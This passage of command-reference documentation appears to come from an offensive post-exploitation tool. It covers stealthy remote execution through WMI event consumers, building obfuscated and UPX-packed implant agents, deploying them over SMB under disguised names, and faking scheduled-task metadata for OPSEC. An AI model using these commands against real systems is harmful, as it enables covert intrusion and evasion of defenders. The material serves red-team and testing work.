usage: wmiexec event [-h] [--consumer-name CONSUMER_NAME]
                     [--filter-name FILTER_NAME]
                     [--trigger-delay TRIGGER_DELAY] [--no-cleanup]
                     [--timeout TIMEOUT] [--no-output] [--save filename]
                     [--working-dir WORKING_DIR] [--shell {cmd,powershell}]
                     [--exe {cmd,pwsh}] [--trigger-exe TRIGGER_EXE]
                     [-t TRIGGER] [-l] [-i] [--system]
                     [--upload-path UPLOAD_PATH] [--script-name SCRIPT_NAME]
                     [-o OUTPUT] [--raw-command] [--raw-exec RAW_EXEC]
                     [command]
Execute commands using WMI Event Consumers (highest stealth method).

Examples:
  # Basic usage
  wmiexec event "whoami"

  # Raw command mode (direct CommandLineTemplate)
  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe

  # Custom artifacts for stealth
  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"

  # With local save
  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"

```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`consumer_name`**: Name for CommandLineEventConsumer (default: auto-generated)
- **`filter_name`**: Name for __EventFilter (default: auto-generated)
- **`trigger_delay`**: Seconds to wait before triggering event
  - Default: `5`
- **`timeout`**: Total execution timeout in seconds
  - Default: `30`
- **`save`**: Save command output to local file
- **`working_dir`**: Working directory for command execution
  - Default: `C:\`
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
- **`exe`**: Execution type: 'cmd' (uploads .bat file) or 'pwsh' (uploads .ps1 file)
  - Choices: cmd, pwsh
  - Default: `cmd`
- **`trigger_exe`**: Executable to trigger the Event Filter (default: notepad.exe). Will be automatically spawned after consumer creation.
  - Default: `notepad.exe`
- **`trigger`**: Only trigger an existing Event Consumer (no creation). Specify executable to spawn.
- **`upload_path`**: Custom script upload path on target (default: C:\Windows\Temp\RANDOM_NAME.ext where ext is .bat for cmd or .ps1 for pwsh)
- **`script_name`**: Custom script filename (without extension, will be auto-appended based on --exe type). If not specified, completely random name is generated.
- **`output`**: Custom remote output file path for capturing command results (default: C:\Windows\Temp\out_RANDOM.tmp). Supports CMS notation.
- **`raw_exec`**: Put the entire command directly into CommandLineTemplate. ExecutablePath is set to the provided string value.
  - Required: No

---

#### `wmiexec query`

**Description:** Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.

**Help:**
```
usage: wmiexec query [-h] [--namespace NAMESPACE]
                     [--format {list,table,json,csv}] [-o FILE]
                     [--timeout SECONDS]
                     [--interactive | --describe CLASS | --list-classes |
                     --template TEMPLATE | --list-templates | query]
Execute WMI Query Language (WQL) queries against the remote system. Supports interactive mode, class description, and multiple output formats.
```

**Example Usage:**
```
Query Examples:
  wmiexec query "SELECT * FROM Win32_Process"
  wmiexec query "SELECT Name, ProcessId FROM Win32_Process WHERE Name = 'notepad.exe'"
  wmiexec query "SELECT * FROM Win32_Service WHERE State = 'Running'"
  wmiexec query --describe Win32_Process
  wmiexec query --interactive
  wmiexec query --template processes --timeout 300
  wmiexec query "SELECT * FROM Win32_UserAccount" --format json -o users.json
  wmiexec query --template processes --format table
```

##### Arguments

- **`query`**: WQL query string to execute (e.g., 'SELECT * FROM Win32_Process')
- **`describe`**: Describe WMI class schema (e.g., --describe Win32_Process)
- **`template`**: Execute predefined query template (use --list-templates to see available)
- **`namespace`**: WMI namespace to query (default: root/cimv2)
  - Default: `root/cimv2`
- **`format`**: Output format for query results (default: list)
  - Choices: list, table, json, csv
  - Default: `list`
- **`output`**: Save query results to file
- **`timeout`**: Query timeout in seconds (default: 120)
  - Default: `120`
  - Required: No

---

## `agent`

**Description:** Build polymorphic C++ agents for named pipe command execution

**Help:**
```
usage: agent [-h]
             {build,info,deploy,list,rename,check,use,start,kill,rm,reset,update} ...
Build polymorphic C++ agents for named pipe command execution
```

**Example Usage:**
```
Example Usage: agent build --arch x64 | agent deploy ./agent.exe --path temp\\ --name myagent --start
```

### Subcommands

#### `agent build`

**Description:** Build C++ agents with advanced obfuscation and polymorphic encryption

**Help:**
```
usage: agent build [-h] [--arch {x86,x64,both}] [--encryption]
                   [--no-encryption] [--debug] [--output-dir OUTPUT_DIR]
                   [--dry-run] [--pipe PIPE] [--name NAME] [--pass PASSPHRASE]
                   [--obfuscate] [--upx PATH]
Build C++ agents with advanced obfuscation and polymorphic encryption
```

**Example Usage:**
```
Examples:
  agent build                                    # Build both x86 and x64 agents with defaults
  agent build --arch x64                         # Build only x64 agent
  agent build --pipe myagent                     # Use custom pipe name "myagent"
  agent build --name slinger                     # Output as slinger_x64.exe/slinger_x86.exe
  agent build --pass MySecretPass123             # Enable HMAC-SHA256 authentication
  agent build --obfuscate                        # Strip symbols and anti-debug
  agent build --obfuscate --upx upx              # Obfuscate and pack with UPX
  agent build --arch x64 --pipe agent1 --pass P@ss --obfuscate  # Full production build
  agent build --dry-run                          # Check build prerequisites without building
  agent build --debug                            # Enable debug logging in agent binary
```

##### Arguments

- **`arch`**: Target architecture for agent build
  - Choices: x86, x64, both
  - Default: `both`
- **`output_dir`**: Custom output directory for built agents
- **`pipe`**: Specify custom pipe name for the agent (default: slinger)
  - Default: `slinger`
- **`name`**: Specify custom name for the output binary file
- **`passphrase`**: Passphrase for agent authentication (HMAC-SHA256 with PBKDF2)
- **`upx`**: Pack Windows PE binary with UPX after building (e.g., --upx /usr/bin/upx or --upx upx for system PATH)
  - Required: No

---

#### `agent info`

**Description:** Display configuration and capabilities of the agent builder

**Help:**
```
usage: agent info [-h]
Display configuration and capabilities of the agent builder
```

  - Required: No

---

#### `agent deploy`

**Description:** Upload and execute polymorphic agent on target system via SMB

**Help:**
```
usage: agent deploy [-h] --path PATH --name NAME [--start]
                    [--method {wmiexec,atexec}] [--pipe PIPE] [--sp PATH]
                    [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
                    [--tf FOLDER] [-w SECS]
                    agent_path
Upload and execute polymorphic agent on target system via SMB
```

**Example Usage:**
```
Examples:
  agent deploy ./agent.exe --path temp\ --name myagent                            # Upload only (no start)
  agent deploy ./agent.exe --path temp\ --name myagent --start                    # Deploy and start with wmiexec (default)
  agent deploy ./agent.exe --path temp\ --name myagent --start --method atexec    # Deploy and start with Task Scheduler
  agent deploy ./agent.exe --path temp\ --name myagent --start --method atexec --ta "SYSTEM" --td "Update Service"

Note: --method, --ta, --td, --tf and other atexec options only apply with --method atexec.
      They are ignored when using the default wmiexec method.

```

##### Arguments

- **`agent_path`**: Path to the agent executable to deploy
- **`path`**: Target path relative to current share (e.g., temp\, Windows\Temp\)
- **`name`**: Name for deployed agent on target (e.g., updater, winlogon)
- **`method`**: Execution method to start agent (default: wmiexec). Only used with --start
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`pipe`**: Specify pipe name for the agent (must match build-time pipe name)
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent list`

**Description:** Show all deployed agents and their status

**Help:**
```
usage: agent list [-h] [--host HOST] [--del DELETE_AGENT]
                  [-f {table,list,json}]
Show all deployed agents and their status
```

**Example Usage:**
```
Example: agent list -f json
```

##### Arguments

- **`host`**: Filter agents by host
- **`delete_agent`**: Remove agent from registry by ID (use 'all' to remove all agents)
- **`format`**: Output format (default: table)
  - Choices: table, list, json
  - Default: `table`
  - Required: No

---

#### `agent rename`

**Description:** Change the ID of a deployed agent in the registry

**Help:**
```
usage: agent rename [-h] --old OLD --new NEW
Change the ID of a deployed agent in the registry
```

**Example Usage:**
```
Example: agent rename --old slinger_abc123 --new my_agent
```

##### Arguments

- **`old`**: Current agent ID
- **`new`**: New agent ID
  - Required: Yes

---

#### `agent check`

**Description:** Verify if the agent process is still running via WMI query

**Help:**
```
usage: agent check [-h] agent_id
Verify if the agent process is still running via WMI query
```

**Example Usage:**
```
Example: agent check slinger_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to check
  - Required: Yes

---

#### `agent use`

**Description:** Connect to and interact with a deployed agent via named pipe.

ENCRYPTION & SESSION SECURITY:
  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
  authentication. Each session uses unique encryption keys:

  1. Agent generates random 16-byte nonce when you connect
  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
     nonce, 10k iterations)
  4. All commands in the session are encrypted with AES-256-GCM using this key

  FORWARD SECRECY: Each session gets a new random nonce and unique session
  key. Compromising one session does NOT affect past or future sessions.
  To refresh encryption keys, exit and reconnect for a new session.

INTERACTIVE SHELL COMMANDS:
  help        - Show available commands
  exit/quit   - Close session and disconnect from agent
  <command>   - Execute any Windows command on the agent


**Help:**
```
usage: agent use [-h] [--timeout TIMEOUT] [--no-colors] agent_id
Connect to and interact with a deployed agent via named pipe.

ENCRYPTION & SESSION SECURITY:
  Agents built with --pass use AES-256-GCM encryption with HMAC-SHA256
  authentication. Each session uses unique encryption keys:

  1. Agent generates random 16-byte nonce when you connect
  2. Client proves knowledge of passphrase via HMAC-SHA256 challenge-response
  3. Both derive session key using PBKDF2-HMAC-SHA256(passphrase_hash,
     nonce, 10k iterations)
  4. All commands in the session are encrypted with AES-256-GCM using this key

  FORWARD SECRECY: Each session gets a new random nonce and unique session
  key. Compromising one session does NOT affect past or future sessions.
  To refresh encryption keys, exit and reconnect for a new session.

INTERACTIVE SHELL COMMANDS:
  help        - Show available commands
  exit/quit   - Close session and disconnect from agent
  <command>   - Execute any Windows command on the agent

```

**Example Usage:**
```
Example: agent use agent_12345 --no-colors
```

##### Arguments

- **`agent_id`**: Agent ID to connect to
- **`timeout`**: Connection timeout in seconds (default: 30)
  - Default: `30`
  - Required: No

---

#### `agent start`

**Description:** Start a stopped or crashed agent using its deployment information

**Help:**
```
usage: agent start [-h] [--method {wmiexec,atexec}] [--sp PATH] [--sn NAME]
                   [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
                   [-w SECS]
                   agent_id
Start a stopped or crashed agent using its deployment information
```

**Example Usage:**
```
Examples:
  agent start slinger_abc123                        # Start using wmiexec (default)
  agent start slinger_abc123 --method atexec        # Start using Task Scheduler
  agent start slinger_abc123 --method atexec --ta "SYSTEM" --td "Maintenance Task"

Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
      They are ignored when using the default wmiexec method.
      Both methods save output to a temp file on target and retrieve it via SMB.
      --sp should be reachable from the connected share.

```

##### Arguments

- **`agent_id`**: Agent ID to start
- **`method`**: Execution method to start agent (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent kill`

**Description:** Find and terminate the agent process using taskkill via WMI or Task Scheduler

**Help:**
```
usage: agent kill [-h] [--method {wmiexec,atexec}] [--sp PATH] [--sn NAME]
                  [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
                  [-w SECS]
                  agent_id
Find and terminate the agent process using taskkill via WMI or Task Scheduler
```

**Example Usage:**
```
Examples:
  agent kill slinger_abc123                        # Kill using wmiexec (default)
  agent kill slinger_abc123 --method atexec        # Kill using Task Scheduler
  agent kill slinger_abc123 --method atexec -w 3   # Wait 3 seconds for task completion
  agent kill slinger_abc123 --method atexec --ta "SYSTEM" --td "Maintenance Task"

Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
      They are ignored when using the default wmiexec method.
      Both methods save output to a temp file on target and retrieve it via SMB.
      --sp should be reachable from the connected share.

```

##### Arguments

- **`agent_id`**: Agent ID to kill
- **`method`**: Execution method for taskkill (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent rm`

**Description:** Delete the agent executable file and update registry status

**Help:**
```
usage: agent rm [-h] agent_id
Delete the agent executable file and update registry status
```

**Example Usage:**
```
Example: agent rm slinger_abc123
```

##### Arguments

- **`agent_id`**: Agent ID to remove
  - Required: Yes

---

#### `agent reset`

**Description:** Kill all running agent processes and delete all agent files

**Help:**
```
usage: agent reset [-h] [--method {wmiexec,atexec}] [--sp PATH] [--sn NAME]
                   [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
                   [-w SECS]
Kill all running agent processes and delete all agent files
```

**Example Usage:**
```
Examples:
  agent reset                                      # Reset using wmiexec (default)
  agent reset --method atexec                      # Reset using Task Scheduler
  agent reset --method atexec -w 3                 # Wait 3 seconds for task completion

Note: --ta, --td, --tf and other atexec options only apply with --method atexec.
      They are ignored when using the default wmiexec method.
      Both methods save output to a temp file on target and retrieve it via SMB.
      --sp should be reachable from the connected share.

```

##### Arguments

- **`method`**: Execution method for kill operations (default: wmiexec)
  - Choices: wmiexec, atexec
  - Default: `wmiexec`
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `agent update`

**Description:** Update the agent's file path in the registry

**Help:**
```
usage: agent update [-h] --path PATH agent_id
Update the agent's file path in the registry
```

**Example Usage:**
```
Example: agent update slinger_abc123 --path c:\new\path\agent.exe
```

##### Arguments

- **`agent_id`**: Agent ID to update
- **`path`**: New file path for the agent
  - Required: Yes

---
